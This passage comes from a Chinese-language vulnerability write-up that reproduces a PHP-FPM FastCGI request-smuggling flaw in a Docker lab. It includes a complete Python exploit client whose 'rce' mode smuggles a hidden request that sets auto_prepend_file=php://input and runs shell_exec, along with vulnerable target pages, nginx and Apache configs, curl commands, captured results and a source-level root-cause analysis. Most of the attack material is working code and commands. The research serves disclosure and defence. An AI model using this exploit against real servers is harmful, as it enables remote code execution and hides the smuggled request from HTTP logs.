变体的输入更短：STDIN 记录是 <code>'A' . $hidden</code>，外请求的 <code>CONTENT_LENGTH=1</code>，由 <code>read1.php</code> 读 1 字节。hidden 请求从 STDIN 记录的第 1 个字节开始，落在外请求声明长度之外。raw 变体把 <code>application/octet-stream</code> 作为外请求的 <code>CONTENT_TYPE</code>，body 直接就是 hidden 请求，用来验证 multipart 解析器的提前停止是不是必要条件。</p><h3 id=\"sec-15\">4、客户端与容器启动</h3><p>客户端只做三件事：拼 FastCGI 记录、把伪造请求放到 5120、把返回的 STDOUT 记录读回来。<code>record()</code> 写 8 字节记录头，<code>params()</code> 编码 name-value 对，<code>fcgi_request()</code> 组装 BEGIN_REQUEST / PARAMS / STDIN，<code>build_multipart()</code> 负责填充和替换，<code>run()</code> 发请求并按记录类型 6 收集输出。</p><pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"直接对 PHP-FPM 说 FastCGI：复现未读 body 在 keep-conn 上变成下一个请求。\n\n用法：\n  python fcgi_client.py --port 9000 --mode multipart --keep on\n  python fcgi_client.py --port 9001 --mode multipart --keep on\n  python fcgi_client.py --port 9000 --mode partial --keep on\n\"\"\"\nimport argparse\nimport socket\nimport struct\nimport sys\nimport time\n\nBOUNDARY = b\"B\"\nSCRIPT = \"/var/www/html/open.php\"\n\n\ndef record(rtype, content=b\"\", rid=1):\n    return struct.pack(\"!BBHHBB\", 1, rtype, rid, len(content), 0, 0) + content\n\n\ndef enc_len(n):\n    if n &lt; 128:\n        return bytes([n])\n    return struct.pack(\"!I\", n | 0x80000000)\n\n\ndef params(d):\n    out = b\"\"\n    for k, v in d.items():\n        k = k.encode()\n        v = str(v).encode()\n        out += enc_len(len(k)) + enc_len(len(v)) + k + v\n    return out\n\n\ndef fcgi_request(rid, keep, ps, stdin=b\"\"):\n    flags = 1 if keep else 0\n    return (\n        record(1, struct.pack(\"!HBxxxxx\", 1, flags), rid)\n        + record(4, params(ps), rid)\n        + record(4, b\"\", rid)\n        + record(5, stdin, rid)\n        + record(5, b\"\", rid)\n    )\n\n\ndef parse_stdout(buf):\n    out = b\"\"\n    i = 0\n    while i + 8 &lt;= len(buf):\n        ver, typ, rid, clen, plen, _ = struct.unpack(\"!BBHHBB\", buf[i : i + 8])\n        i += 8\n        content = buf[i : i + clen]\n        i += clen + plen\n        if typ == 6:\n            out += content\n    return out\n\n\ndef hidden_request(script):\n    ps = {\n        \"GATEWAY_INTERFACE\": \"FastCGI/1.0\",\n        \"REQUEST_METHOD\": \"GET\",\n        \"SCRIPT_FILENAME\": script,\n        \"SCRIPT_NAME\": \"/h.php\",\n        \"REQUEST_URI\": \"/h.php\",\n        \"SERVER_PROTOCOL\": \"HTTP/1.1\",\n        \"REMOTE_ADDR\": \"203.0.113.1\",\n        \"CONTENT_LENGTH\": \"0\",\n    }\n    return fcgi_request(2, False, ps, b\"\")\n\n\ndef hidden_rce(script, payload):\n    ps = {\n        \"GATEWAY_INTERFACE\": \"FastCGI/1.0\",\n        \"REQUEST_METHOD\": \"POST\",\n        \"SCRIPT_FILENAME\": script,\n        \"SCRIPT_NAME\": \"/open.php\",\n        \"REQUEST_URI\": \"/open.php\",\n        \"SERVER_PROTOCOL\": \"HTTP/1.1\",\n        \"REMOTE_ADDR\": \"203.0.113.1\",\n        \"CONTENT_TYPE\": \"application/x-www-form-urlencoded\",\n        \"CONTENT_LENGTH\": str(len(payload)),\n        \"PHP_ADMIN_VALUE\": \"allow_url_include=1\\nauto_prepend_file=php://input\",\n    }\n    return fcgi_request(2, False, ps, payload)\n\n\ndef build_multipart(script, body_len, offset, hidden=None):\n    if hidden is None:\n        hidden = hidden_request(script)\n    body = b\"--\" + BOUNDARY + b\"\\r\\nContent-Disposition: form-data\\r\\n\\r\\n\"\n    body = body.ljust(body_len, b\"A\")\n    if offset + len(hidden) &gt; body_len:\n        raise SystemExit(\"offset + hidden 超过 body 长度\")\n    return body[:offset] + hidden + body[offset + len(hidden) :]\n\n\ndef build_partial(script):\n    return b\"A\" + hidden_request(script)\n\n\ndef run(host, port, mode, keep, body_len, offset, wait, payload, script=SCRIPT):\n    if mode == \"multipart\":\n        stdin = build_multipart(SCRIPT, body_len, offset)\n        ps = {\n            \"GATEWAY_INTERFACE\": \"FastCGI/1.0\",\n            \"REQUEST_METHOD\": \"POST\",\n            \"SCRIPT_FILENAME\": script,\n            \"SCRIPT_NAME\": \"/outer.php\",\n            \"REQUEST_URI\": \"/outer.php\",\n            \"SERVER_PROTOCOL\": \"HTTP/1.1\",\n            \"REMOTE_ADDR\": \"127.0.0.1\",\n            \"CONTENT_TYPE\": \"multipart/form-data; boundary=B\",\n            \"CONTENT_LENGTH\": str(len(stdin)),\n        }\n    elif mode == \"rce\":\n        stdin = build_multipart(\n            SCRIPT, body_len, offset, hidden_rce(SCRIPT, payload.encode())\n        )\n        ps = {\n            \"GATEWAY_INTERFACE\": \"FastCGI/1.0\",\n            \"REQUEST_METHOD\": \"POST\",\n            \"SCRIPT_FILENAME\": script,\n            \"SCRIPT_NAME\": \"/outer.php\",\n            \"REQUEST_URI\": \"/outer.php\",\n            \"SERVER_PROTOCOL\": \"HTTP/1.1\",\n            \"REMOTE_ADDR\": \"127.0.0.1\",\n            \"CONTENT_TYPE\": \"multipart/form-data; boundary=B\",\n            \"CONTENT_LENGTH\": str(len(stdin)),\n        }\n    elif mode == \"raw\":\n        stdin = hidden_request(SCRIPT)\n        ps = {\n            \"GATEWAY_INTERFACE\": \"FastCGI/1.0\",\n            \"REQUEST_METHOD\": \"POST\",\n            \"SCRIPT_FILENAME\": script,\n            \"SCRIPT_NAME\": \"/outer.php\",\n            \"REQUEST_URI\": \"/outer.php\",\n            \"SERVER_PROTOCOL\": \"HTTP/1.1\",\n            \"REMOTE_ADDR\": \"127.0.0.1\",\n            \"CONTENT_TYPE\": \"application/octet-stream\",\n            \"CONTENT_LENGTH\": str(len(stdin)),\n        }\n    else:\n        stdin = build_partial(SCRIPT)\n        ps = {\n            \"GATEWAY_INTERFACE\": \"FastCGI/1.0\",\n            \"REQUEST_METHOD\": \"POST\",\n            \"SCRIPT_FILENAME\": \"/var/www/html/read1.php\",\n            \"SCRIPT_NAME\": \"/read1.php\",\n            \"REQUEST_URI\": \"/read1.php\",\n            \"SERVER_PROTOCOL\": \"HTTP/1.1\",\n            \"REMOTE_ADDR\": \"127.0.0.1\",\n            \"CONTENT_TYPE\": \"application/octet-stream\",\n            \"CONTENT_LENGTH\": \"1\",\n        }\n\n    req = fcgi_request(1, keep, ps, stdin)\n    s = socket.create_connection((host, port), timeout=5)\n    s.sendall(req)\n    s.shutdown(socket.SHUT_WR)\n    s.settimeout(0.5)\n    buf = b\"\"\n    end = time.time() + wait\n    while time.time() &lt; end:\n        try:\n            chunk = s.recv(65536)\n        except socket.timeout:\n            continue\n        except ConnectionResetError:\n            print(\"connection reset by peer\", file=sys.stderr)\n            break\n        if not chunk:\n            break\n        buf += chunk\n    s.close()\n    return parse_stdout(buf)\n\n\ndef main():\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--host\", default=\"127.0.0.1\")\n    ap.add_argument(\"--port\", type=int, default=9000)\n    ap.add_argument(\n        \"--mode\", choices=[\"multipart\", \"partial\", \"rce\", \"raw\"], default=\"multipart\"\n    )\n    ap.add_argument(\"--keep\", choices=[\"on\", \"off\"], default=\"on\")\n    ap.add_argument(\"--body-len\", type=int, default=12000)\n    ap.add_argument(\"--offset\", type=int, default=5120)\n    ap.add_argument(\"--wait\", type=float, default=2.5)\n    ap.add_argument(\"--write-body\", default=\"\", help=\"只写出 multipart body 到文件，不发请求\")\n    ap.add_argument(\"--script\", default=SCRIPT)\n    ap.add_argument(\n        \"--payload\",\n        default=\"&lt;?php file_put_contents('/tmp/rce.txt', shell_exec('id')); ?&gt;\",\n    )\n    args = ap.parse_args()\n\n    if args.write_body:\n        hidden = hidden_rce(SCRIPT, args.payload.encode()) if args.mode == \"rce\" else None\n        body = build_multipart(SCRIPT, args.body_len, args.offset, hidden)\n        with open(args.write_body, \"wb\") as f:\n            f.write(body)\n        print(\"wrote %d bytes to %s\" % (len(body), args.write_body))\n        return 0\n\n    out = run(\n        args.host,\n        args.port,\n        args.mode,\n        args.keep == \"on\",\n        args.body_len,\n        args.offset,\n        args.wait,\n        args.payload,\n        args.script,\n    )\n    text = out.decode(\"utf-8\", \"replace\")\n    print(\"STDOUT=%r\" % out)\n    print(\"smuggled=%s outer=%s\" % (\"smuggled\\n\" in text, \"outer\\n\" in text))\n    return 0 if \"smuggled\\n\" in text else 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())</code></pre><p>靶页 <code>app/open.php</code>：</p><pre><code>&lt;?php\n// 外请求走 else：打开 php://input 但不读；内请求伪造 REMOTE_ADDR 走进 if。\nif ($_SERVER['REMOTE_ADDR'] === '203.0.113.1') {\n    file_put_contents('/tmp/smuggled.txt', 'REMOTE_ADDR=' . $_SERVER['REMOTE_ADDR'] . \"\\n\");\n    echo \"smuggled\\n\";\n} else {\n    $input = fopen('php://input', 'r');\n    echo \"outer\\n\";\n}</code></pre><p><code>app/read1.php</code>：</p><pre><code>&lt;?php\n// 部分读取：CONTENT_LENGTH 只有 1，但 STDIN 记录里还有伪造请求。\nif ($_SERVER['REMOTE_ADDR'] === '203.0.113.1') {\n    echo \"smuggled\\n\";\n} else {\n    echo \"outer \", strlen(file_get_contents('php://input')), \"\\n\";\n}</code></pre><p><code>app/plain.php</code>：</p><pre><code>&lt;?php\necho \"plain\\n\";</code></pre><p><code>app/openread.php</code>：</p><pre><code>&lt;?php\n// 读完整对照组：打开并把 php://input 读到结尾，剩余字节不会留在连接里。\nif ($_SERVER['REMOTE_ADDR'] === '203.0.113.1') {\n    file_put_contents('/tmp/smuggled.txt', 'REMOTE_ADDR=' . $_SERVER['REMOTE_ADDR'] . \"\\n\");\n    echo \"smuggled\\n\";\n} else {\n    $data = file_get_contents('php://input');\n    echo \"read \" . strlen($data) . \"\\n\";\n}</code></pre><p><code>app/noopen.php</code>：</p><pre><code>&lt;?php\n// 关闭对照组：不打开 php://input，PHP 会走 else 分支丢弃未读 body。\nif ($_SERVER['REMOTE_ADDR'] === '203.0.113.1') {\n    file_put_contents('/tmp/smuggled.txt', 'REMOTE_ADDR=' . $_SERVER['REMOTE_ADDR'] . \"\\n\");\n    echo \"smuggled\\n\";\n} else {\n    echo \"noopen\\n\";\n}</code></pre><p><code>nginx.conf</code> 里保留三个入口：<code>/open.php</code> 走 <code>fastcgi_keep_conn on</code>，<code>/open-nokeep.php</code> 走 <code>off</code>，<code>/fixed/open.php</code> 指向 8.4.28。<code>host.docker.internal</code> 由 nginx 容器启动时的 <code>--add-host host.docker.internal:host-gateway</code> 指向宿主机网关；修复版 FPM 在宿主机上监听 9001。</p><pre><code>worker_processes 1;\npid /tmp/nginx.pid;\nerror_log /dev/stderr warn;\n\nevents {\n    worker_connections 1024;\n}\n\nhttp {\n    include /etc/nginx/mime.types;\n    default_type application/octet-stream;\n    access_log /dev/stdout;\n    client_max_body_size 1m;\n    client_body_buffer_size 32k;\n\n    server {\n        listen 80;\n        root /var/www/html;\n\n        location = /open.php {\n            include fastcgi_params;\n            fastcgi_pass phpfpm-vuln:9000;\n            fastcgi_param SCRIPT_FILENAME /var/www/html/open.php;\n            fastcgi_keep_conn on;\n        }\n\n        location = /fixed/open.php {\n            include fastcgi_params;\n            fastcgi_pass host.docker.internal:9001;\n            fastcgi_param SCRIPT_FILENAME /var/www/html/open.php;\n            fastcgi_keep_conn on;\n        }\n\n        location = /open-nokeep.php {\n            include fastcgi_params;\n            fastcgi_pass phpfpm-vuln:9000;\n            fastcgi_param SCRIPT_FILENAME /var/www/html/open.php;\n            fastcgi_keep_conn off;\n        }\n\n        location = /read1.php {\n            include fastcgi_params;\n            fastcgi_pass phpfpm-vuln:9000;\n            fastcgi_param SCRIPT_FILENAME /var/www/html/read1.php;\n            fastcgi_keep_conn on;\n        }\n    }\n}</code></pre><p>Apache 的两个容器共用同一份配置，<code>apache-on.conf</code> 如下；<code>apache-off.conf</code> 只把 <code>ProxySet enablereuse=on</code> 改成 <code>off</code>：</p><pre><code>ServerRoot \"/usr/local/apache2\"\nListen 80\n\nLoadModule mpm_event_module modules/mod_mpm_event.so\nLoadModule authz_core_module modules/mod_authz_core.so\nLoadModule mime_module modules/mod_mime.so\nLoadModule proxy_module modules/mod_proxy.so\nLoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so\nLoadModule unixd_module modules/mod_unixd.so\n\nUser www-data\nGroup www-data\n\nServerName localhost\nDocumentRoot \"/var/www/html\"\n\n&lt;Directory \"/var/www/html\"&gt;\n    Require all granted\n&lt;/Directory&gt;\n\nProxyFCGIBackendType GENERIC\n\n&lt;FilesMatch \\.php$&gt;\n    SetHandler \"proxy:fcgi://phpfpm-vuln:9000\"\n&lt;/FilesMatch&gt;\n\n&lt;Proxy \"fcgi://phpfpm-vuln:9000\"&gt;\n    ProxySet enablereuse=on\n&lt;/Proxy&gt;\n\nErrorLog /proc/self/fd/2\nLogLevel warn</code></pre><p>漏洞版 FPM 的 access log 配置，挂到容器的 <code>/usr/local/etc/php-fpm.d/zz-access.conf</code>：</p><pre><code>[www]\naccess.log = /tmp/fpm-access.log\naccess.format = \"%R - %u %t \\\"%m %r\\\" %s %f\"</code></pre><p>修复版 FPM 配置：</p><pre><code>[global]\nerror_log = /tmp/php-fpm8428.log\ndaemonize = no\n\n[www]\nuser = www-data\ngroup = www-data\nlisten = 0.0.0.0:9001\npm = static\npm.max_children = 1\ncatch_workers_output = yes\naccess.log = /tmp/php8428-access.log\naccess.format = \"%R - %u %t \\\"%m %r\\\" %s %f\"</code></pre><p>构建脚本 <code>build_fixed_host.sh</code>：</p><pre><code>#!/bin/bash\nset -e\n\ncd /tmp\ncurl -fsSL -C - --max-time 280 https://www.php.net/distributions/php-8.4.28.tar.gz -o php8428.tar.gz\ntar xzf php8428.tar.gz\ncd php-8.4.28\n\n./configure --disable-all --enable-fpm --disable-libxml \\\n  --prefix=/opt/php8428 \\\n  --with-config-file-path=/opt/php8428/etc \\\n  --without-pear\n\nmake -j4\nmake install\n\n/opt/php8428/bin/php -v</code></pre><p>重启脚本 <code>restart_fixed.sh</code>：</p><pre><code>#!/bin/bash\nPID=$(ss -ltnp 2&gt;/dev/null | sed -n 's/.*:9001 .*pid=\\([0-9]*\\).*/\\1/p' | head -1)\nif [ -n \"$PID\" ]; then\n    kill \"$PID\"\n    sleep 1\nfi\nnohup /opt/php8428/sbin/php-fpm -F -y /opt/phpfpm-smuggle-lab/php-fpm-8428.conf &gt;/tmp/php-fpm8428.out 2&gt;&amp;1 &amp;\nsleep 1\nss -ltn | grep 9001 || echo no-listen</code></pre><h3 id=\"sec-16\">5、命中与执行</h3><p>反例：同一套 body，<code>keep off</code> 时 FPM 在响应后关闭连接，第二个请求没有落脚点。解析器的告警还在，但它只是告警，不是命中。</p><pre><code>cd /opt/phpfpm-smuggle-lab\npython3 /opt/phpfpm-smuggle-lab/fcgi_client.py --port 9000 --mode multipart --keep off</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001520-3edd47e7-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=c22ee069ad492dab\" loading=\"lazy\" decoding=\"async\" width=\"1384.740267243619\" height=\"141\"></p><p>正例：同一个 body，<code>keep on</code> 时 socket 上出现两段完整的 FastCGI 响应。第一段是外请求的 <code>outer</code>，第二段是 hidden 请求的 <code>smuggled</code>。</p><pre><code>python3 /opt/phpfpm-smuggle-lab/fcgi_client.py --port 9000 --mode multipart --keep on</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001521-3f25b9d9-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=629d4e605edff098\" loading=\"lazy\" decoding=\"async\" width=\"1387.987020507965\" height=\"139\"></p><p>RCE 模式把 hidden 请求换成带 <code>PHP_ADMIN_VALUE</code> 的版本：</p><pre><code>python3 /opt/phpfpm-smuggle-lab/fcgi_client.py --port 9000 --mode rce --keep on</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001521-3f6bd407-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=1eb63e1243a1f1c8\" loading=\"lazy\" decoding=\"async\" width=\"1390.4220854562247\" height=\"136\"></p><pre><code>docker exec phpfpm-vuln cat /tmp/rce.txt\ndocker exec phpfpm-vuln cat /tmp/smuggled.txt</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001522-3fb18c02-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=f231f1170e544aef\" loading=\"lazy\" decoding=\"async\" width=\"716.7207831044054\" height=\"159\"></p><p>partial 变体走另一条记录路径：<code>CONTENT_LENGTH=1</code>，STDIN 记录里是 <code>A</code> 加 hidden 请求，<code>read1.php</code> 只读 1 字节。<code>smuggled=True</code> 说明 hidden 请求仍被执行；<code>outer=False</code> 是因为客户端只匹配裸 <code>outer\\n</code>，第一段实际是 <code>outer 1\\n</code>。</p><pre><code>python3 /opt/phpfpm-smuggle-lab/fcgi_client.py --port 9000 --mode partial --keep on</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001522-3ff96789-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=c5f05179acdf9fd5\" loading=\"lazy\" decoding=\"async\" width=\"1392.8571504044842\" height=\"120\"></p><p>nginx 路径的 HTTP 响应：body 用 <code>--write-body</code> 写到文件，再由 curl 发出；响应头是正常的 200，响应体只有 <code>outer</code>，第二段响应没有回到 HTTP 客户端。</p><pre><code>python3 /opt/phpfpm-smuggle-lab/fcgi_client.py --write-body /tmp/body.bin --offset 5120 --body-len 12000\ncurl -sS -D- --data-binary @/tmp/body.bin \\\n  -H 'Content-Type: multipart/form-data; boundary=B' \\\n  http://127.0.0.1:8080/open.php</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001523-404ab52c-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=39b28bec31d6a604\" loading=\"lazy\" decoding=\"async\" width=\"1391.2337737723112\" height=\"353\"></p><p>hidden 请求换成 RCE 版本后，HTTP 响应仍是 200；副作用文件证明第二个请求执行：</p><pre><code>python3 /opt/phpfpm-smuggle-lab/fcgi_client.py --write-body /tmp/body_rce.bin --mode rce --offset 5120 --body-len 12000</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001523-408f31ec-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=1322c0f927199fd4\" loading=\"lazy\" decoding=\"async\" width=\"1338.4740332266867\" height=\"95\"></p><pre><code>curl -sS -o /dev/null -w 'http=%{http_code}\\n' --data-binary @/tmp/body_rce.bin \\\n  -H 'Content-Type: multipart/form-data; boundary=B' \\\n  http://127.0.0.1:8080/open.php\ndocker exec phpfpm-vuln cat /tmp/rce.txt</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001523-40d8d519-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=d872fa0c12dafbaa\" loading=\"lazy\" decoding=\"async\" width=\"998.3766287864311\" height=\"210\"></p><p>nginx 只记一条 HTTP 请求：</p><pre><code>docker logs phpfpm-nginx 2&gt;&amp;1 | tail -1</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001524-411b55f7-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=ed8b619409ed6fdd\" loading=\"lazy\" decoding=\"async\" width=\"955.357148033845\" height=\"92\"></p><p>FPM 的 access log 如果打开，会看到两条 FastCGI 请求。第二条 <code>GET /h.php</code> 不是客户端发的 HTTP 请求：</p><pre><code>docker rm -f phpfpm-vuln-log &gt;/dev/null 2&gt;&amp;1\ndocker run -d --name phpfpm-vuln-log \\\n  -p 9002:9000 \\\n  -v /opt/phpfpm-smuggle-lab/app:/var/www/html \\\n  -v /opt/phpfpm-smuggle-lab/fpm-access.conf:/usr/local/etc/php-fpm.d/zz-access.conf:ro \\\n  php:8.4.27-fpm &gt;/dev/null\npython3 /opt/phpfpm-smuggle-lab/fcgi_client.py --port 9002 --mode multipart --keep on\ndocker exec phpfpm-vuln-log cat /tmp/fpm-access.log</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001524-4170e647-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=ec5eab21ca087ae5\" loading=\"lazy\" decoding=\"async\" width=\"1392.8571504044842\" height=\"391\"></p><p><code>172.17.0.1</code> 是 Docker 宿主机在 <code>phpfpm-vuln-log</code> 眼里的连接对端，不是 hidden 请求里伪造的 <code>203.0.113.1</code>；伪造值只进了 <code>$_SERVER['REMOTE_ADDR']</code>。</p><p>Apache 路径用同一份 body，只是把 HTTP 入口换到 8081。<code>enablereuse=on</code> 时响应体同样只有 <code>outer</code>，<code>/tmp/smuggled.txt</code> 在 FPM 容器里：</p><pre><code>docker exec phpfpm-vuln rm -f /tmp/smuggled.txt /tmp/rce.txt\ncurl -sS -D- --data-binary @/tmp/body.bin \\\n  -H 'Content-Type: multipart/form-data; boundary=B' \\\n  http://127.0.0.1:8081/open.php</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001525-41c78d1d-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=2434310d39d4237c\" loading=\"lazy\" decoding=\"async\" width=\"1328.7337734336484\" height=\"304\"></p><pre><code>docker exec phpfpm-vuln cat /tmp/smuggled.txt</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001525-42089a4a-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=df7435bb3918d70a\" loading=\"lazy\" decoding=\"async\" width=\"516.2337690310326\" height=\"81\"></p><p>RCE 换 <code>body_rce.bin</code>，结果和 nginx 路径一致：</p><pre><code>docker restart httpd-fcgi-on &gt;/dev/null\nsleep 2\ndocker exec phpfpm-vuln rm -f /tmp/smuggled.txt /tmp/rce.txt\ncurl -sS -o /dev/null -w 'http=%{http_code}\\n' --data-binary @/tmp/body_rce.bin \\\n  -H 'Content-Type: multipart/form-data; boundary=B' \\\n  http://127.0.0.1:8081/open.php\ndocker exec phpfpm-vuln cat /tmp/rce.txt</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001526-4251cc06-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=a0ec99fcc3c4faba\" loading=\"lazy\" decoding=\"async\" width=\"897.7272775917014\" height=\"207\"></p><p>换到 8082（<code>enablereuse=off</code>），同样的 body 不再留下副作用：</p><pre><code>docker exec phpfpm-vuln rm -f /tmp/smuggled.txt /tmp/rce.txt\ncurl -sS -o /dev/null -w 'http=%{http_code}\\n' --data-binary @/tmp/body.bin \\\n  -H 'Content-Type: multipart/form-data; boundary=B' \\\n  http://127.0.0.1:8082/open.php\ndocker exec phpfpm-vuln cat /tmp/smuggled.txt 2&gt;/dev/null || echo no-file</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001526-42977be5-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=6005c838522bb172\" loading=\"lazy\" decoding=\"async\" width=\"866.8831215804133\" height=\"178\"></p><h3 id=\"sec-17\">6、执行身份与落点</h3><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>观测点</p></td><td colspan=\"1\" rowspan=\"1\"><p>值</p></td><td colspan=\"1\" rowspan=\"1\"><p>说明</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>进程身份</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>uid=33(www-data) gid=33(www-data)</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>官方镜像里的 FPM worker</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>落点文件</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>/tmp/rce.txt</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>容器内 <code>/tmp</code>，worker 可写</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>脚本路径</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>/var/www/html/open.php</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>hidden 请求的 <code>SCRIPT_FILENAME</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>应用看到的来源</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>203.0.113.1</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>hidden 请求的 <code>REMOTE_ADDR</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>FPM access log <code>%R</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>172.17.0.1</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>TCP 对端，不是伪造值</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>nginx access log</p></td><td colspan=\"1\" rowspan=\"1\"><p>一条 <code>POST /open.php</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>第二个请求不在 HTTP 日志里</p></td></tr></tbody></table><p>hidden 请求的 <code>SCRIPT_NAME</code>/<code>REQUEST_URI</code> 可以和 <code>SCRIPT_FILENAME</code> 不一致；<code>auto_prepend_file=php://input</code> 执行 hidden STDIN，<code>/tmp</code> 是 1777，worker 可写，落点可以换到应用的临时、上传或日志目录。<code>REMOTE_ADDR</code> 的伪造只进 FastCGI 参数，不改 FPM access log 的 <code>%R</code>，也不改前端的连接对端。</p><h2 id=\"sec-18\">五、漏洞分析</h2><h3 id=\"sec-19\">1、输入怎么被解析或应用</h3><p>multipart 解析器的 <code>FILLUNIT</code> 是 5120（<code>main/rfc1867.c:187</code>）。第一次填充读到前缀加 <code>A</code>；第二次从 5120 开始，正好是伪造的 FastCGI 记录。<code>multipart_buffer_headers()</code> 找不到 <code>name</code>/<code>filename</code>，在 <code>main/rfc1867.c:1027</code> 报 <code>File Upload Mime headers garbled</code>，<code>goto fileupload_done</code> 停止解析，剩余 6880 字节留在 STDIN 记录里。</p><p>请求关闭时，<code>main/SAPI.c:501</code> 的 <code>request_body</code> 分支决定是否 drain：脚本打开过 <code>php://input</code> 时 <code>request_body</code> 非空，直接跳过；没打开时 <code>request_body</code> 为空，<code>post_read=0</code>，drain 执行，剩余字节被读掉。</p><p><code>fcgi_read_request()</code> 在 <code>main/fastcgi.c:1044</code> 把 <code>req-&gt;in_len</code> 清零，再从连接读下一组记录。残留从 <code>\\x01</code> 开头的 BEGIN_REQUEST 开始，FPM 把它当成新请求；整个过程中没有检查“上一条 STDIN 记录是不是只读了一半”。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001527-42d30275-e822-1.svg&amp;mode=full&amp;exp=1796169600&amp;sig=0467f8cfdd129a4b\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001527-42d30275-e822-1.svg&amp;mode=thumb&amp;exp=1796169600&amp;sig=6fd8db9c32a4d61e 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001527-42d30275-e822-1.svg&amp;mode=image-1200&amp;exp=1796169600&amp;sig=4a89be4acb15a9fe 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001527-42d30275-e822-1.svg&amp;mode=full&amp;exp=1796169600&amp;sig=0467f8cfdd129a4b 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"736\"></p><h3 id=\"sec-20\">2、校验为什么没拦住</h3><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>层</p></td><td colspan=\"1\" rowspan=\"1\"><p>缺口</p></td><td colspan=\"1\" rowspan=\"1\"><p>结果</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>请求关闭</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>request_body</code> 只表示“流存在”，不表示“读完了”</p></td><td colspan=\"1\" rowspan=\"1\"><p>打开 <code>php://input</code> 但没读完时，跳过 drain</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>FastCGI 记录</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>fcgi_read_request()</code> 先把 <code>req-&gt;in_len</code> 清零，不检查残留</p></td><td colspan=\"1\" rowspan=\"1\"><p>剩余 6880 字节被当成新请求</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>HTTP 前端</p></td><td colspan=\"1\" rowspan=\"1\"><p>看到的是一条合法 multipart 